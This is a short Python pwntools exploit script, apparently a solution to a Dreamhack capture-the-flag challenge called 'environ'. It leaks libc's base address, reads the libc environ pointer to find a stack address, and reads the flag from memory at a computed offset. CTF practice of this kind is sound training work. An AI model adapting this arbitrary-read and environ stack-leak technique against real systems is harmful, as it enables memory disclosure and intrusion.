#!/usr/bin/env python3
from pwn import *

PORT = 16042
HOST = "host3.dreamhack.games"
elf = context.binary = ELF('./environ_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
            brva 0x13b6
            brva 0x13e8
            c
            set follow-fork-mode parent
            ''')

def conn():
    if args.REMOTE:
        return remote(HOST, PORT)
    else:
        return elf.process()

p = conn()

# GDB()

p.recvuntil(b"stdout: ")
libc.address = int(p.recvline()[:-1], 16) - 0x21a780
log.info("libc_base: " + hex(libc.address))

p.sendlineafter(b"> ", str(1).encode())
p.sendlineafter(b"Addr: ", str(libc.sym.environ).encode())
stack_leak = u64(p.recv(6).ljust(8, b'\0'))
stack_flag = stack_leak - 0x1568
log.info("stack_flag: " + hex(stack_flag))

p.sendlineafter(b"> ", str(1).encode())
p.sendlineafter(b"Addr: ", str(stack_flag).encode())

p.interactive()